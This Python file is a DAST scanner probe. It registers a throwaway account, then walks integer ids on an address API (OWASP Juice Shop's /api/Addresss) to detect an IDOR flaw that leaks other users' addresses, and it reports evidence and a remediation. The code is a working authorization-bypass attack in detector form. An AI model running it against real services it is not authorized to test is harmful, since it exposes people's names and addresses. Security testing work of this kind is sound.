#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authorization (BOLA): caller can read other users' shipping addresses
by walking small integer ids.

Juice Shop's address endpoint is mounted at /api/Addresss (note the
typo'd plural — three S's), which evades dictionary-based scanners
that probe /api/Addresses. The endpoint returns address rows by id
without checking the caller's ownership.

Detection signal:
  Register a fresh user, log in, walk GET /api/Addresss/{1..N} with
  the new session's token. At least one row returned has UserId !=
  the caller — i.e. someone else's address.

Tested against:
  + OWASP Juice Shop  /api/Addresss/1 (admin's seeded address)
                      returns to a non-admin → validated=True.
  + nginx default site → validated=False
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

ADDRESS_PATHS = (
    "/api/Addresss/{id}",       # Juice Shop's typo'd path
    "/api/Addresses/{id}",      # the spelling other apps use
    "/api/addresses/{id}",
)


def _register_and_login(client: SafeClient, origin: str) -> dict:
    email = f"address-idor-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw,
                 "token": None, "user_id": None}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status
    if r.status in (200, 201) and r.body:
        try:
            doc = json.loads(r.text)
            data = doc.get("data") if isinstance(doc, dict) else None
            uid = (data or {}).get("id") if isinstance(data, dict) else None
            out["user_id"] = uid
        except json.JSONDecodeError:
            pass

    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
            if out["user_id"] is None:
                out["user_id"] = auth.get("uid") or auth.get("id")
        except json.JSONDecodeError:
            pass
    return out


class AddressIdorWalkProbe(Probe):
    name = "authz_address_idor_walk"
    summary = ("Detects address-IDOR: walking small integer ids on "
               "/api/Addresss returns other users' addresses.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--max-id", type=int, default=10,
            help="Walk address ids 1..max-id (default 10).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        sess = _register_and_login(client, origin)
        if not sess.get("token"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=f"Inconclusive: no probe session on {origin}.",
                evidence={"origin": origin,
                          "session": {k: v for k, v in sess.items()
                                      if k != "password"}},
            )
        token   = sess["token"]
        own_uid = sess.get("user_id")

        # We try each candidate path until one returns a 200 — that
        # tells us which spelling the server uses; we then walk ids
        # against that path.
        attempts: list[dict] = []
        confirmed: dict | None = None
        for ptemplate in ADDRESS_PATHS:
            for aid in range(1, max(2, int(args.max_id)) + 1):
                url = urljoin(origin, ptemplate.format(id=aid))
                r = client.request("GET", url, headers={
                    "Authorization": f"Bearer {token}",
                })
                row: dict = {"address_id": aid, "url": url,
                             "status": r.status, "size": r.size}
                if r.status == 200 and r.body:
                    try:
                        doc = json.loads(r.text)
                    except json.JSONDecodeError:
                        attempts.append(row); continue
                    data = (doc.get("data") if isinstance(doc, dict)
                            else None) or {}
                    if isinstance(data, dict):
                        ruid = data.get("UserId") or data.get("userId")
                        row["returned_user_id"] = ruid
                        if ruid is not None and own_uid is not None \
                                and ruid != own_uid:
                            row["foreign_address"] = True
                            row["sample"] = {k: data.get(k) for k in
                                             ("country", "city",
                                              "fullName", "zipCode")
                                             if data.get(k)}
                            confirmed = row
                            attempts.append(row)
                            break
                attempts.append(row)
            if confirmed:
                break
            # Don't pile retries onto a path whose first id 404'd — try
            # the next spelling instead.
            if attempts and attempts[-1].get("status") == 404:
                continue
            else:
                # We got a real response for this path; no need to walk
                # the alternate spellings.
                break

        evidence = {"origin": origin, "own_user_id": own_uid,
                    "session_email": sess.get("email"),
                    "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: address IDOR on {origin} — "
                         f"address id {confirmed['address_id']} "
                         f"(UserId={confirmed.get('returned_user_id')}) "
                         f"returned to our caller (UserId={own_uid})."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="high",
                remediation=(
                    "Filter the address query by the caller's user id: "
                    "`SELECT * FROM addresses WHERE id = ? AND user_id "
                    "= req.user.id`. Or use a row-level authorization "
                    "middleware that compares `record.userId` to the "
                    "JWT subject."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: walked address ids on {origin}; no "
                     "foreign address leaked."),
            evidence=evidence,
        )


if __name__ == "__main__":
    AddressIdorWalkProbe().main()
